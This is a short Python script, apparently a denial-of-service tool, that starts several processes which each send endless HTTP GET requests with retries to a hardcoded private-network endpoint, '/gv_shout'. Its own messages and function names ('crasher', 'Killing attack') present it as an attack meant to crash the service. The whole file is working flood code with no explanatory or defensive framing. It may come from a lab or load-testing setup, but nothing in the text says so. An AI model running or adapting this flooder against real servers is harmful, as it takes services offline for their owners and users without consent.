import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
# import threading
import multiprocessing
import signal

url = 'http://10.30.40.181/gv_shout'

def handler(signum, frame):
  print("Killing attack", end="", flush=True)
  exit(1)
  
def crasher():
  retry = Retry(connect=3, backoff_factor=0.5)
  adapter = HTTPAdapter(max_retries=retry)

  while True:
    session = requests.Session()
    session.mount('http://', adapter)
    # session.mount('https://', adapter)

    session.get(url)
    session.close()
    print("got site")

def multiThreadCrasher(threadCount):
  processes = []

  signal.signal(signal.SIGINT, handler)

  for i in range(threadCount):
    # threads.append(threading.Thread(target=crasher,name=i))
    processes.append(multiprocessing.Process(target=crasher,name="{}".format(i)))

  for i in range(len(processes)):
    processes[i].start()
    # processes[i].join()

if __name__ == "__main__":
  multiThreadCrasher(2)
